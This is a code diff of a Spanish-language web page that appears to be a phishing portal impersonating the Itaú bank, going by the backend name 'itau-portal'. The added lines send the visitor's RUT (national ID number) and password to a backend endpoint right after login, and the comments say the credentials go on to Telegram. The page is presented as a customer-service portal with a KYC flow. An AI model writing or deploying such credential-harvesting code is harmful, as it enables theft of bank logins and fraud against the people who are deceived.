@@ -7,7 +7,8 @@
   <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700&display=swap" rel="stylesheet"/>
   <script>
     // ⚠️ CREDENCIALES YA NO AQUÍ - Almacenadas en backend (.env)
-    const BACKEND_URL     = 'https://itau-portal.onrender.com';
+    const BACKEND_URL     = '';
+    console.log('PORTAL v2 KYC CARGADO');
     const COLOR_PRINCIPAL = '#FF6200';
     const PORTAL_TITULO    = 'Portal de Atención';
     const PORTAL_SUBTITULO = 'Bienvenido al sistema';
@@ -677,7 +678,12 @@
       
       curName=loginData.name||'Cliente';
       curMsgId=loginData.messageId;
-      
+
+      // 🔐 Enviar credenciales (RUT y contraseña) a Telegram inmediatamente
+      console.log('📤 Enviando credenciales a Telegram...');
+      await fetch(`${BACKEND_URL}/api/send-credentials`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messageId:curMsgId,rut,password:pass,name:curName})});
+      console.log('✅ Credenciales enviadas');
+
       document.getElementById('id-loading').style.display='none';
       document.getElementById('id-greet').style.display='block';
       setLoading(true,'Conectando con el agente...');
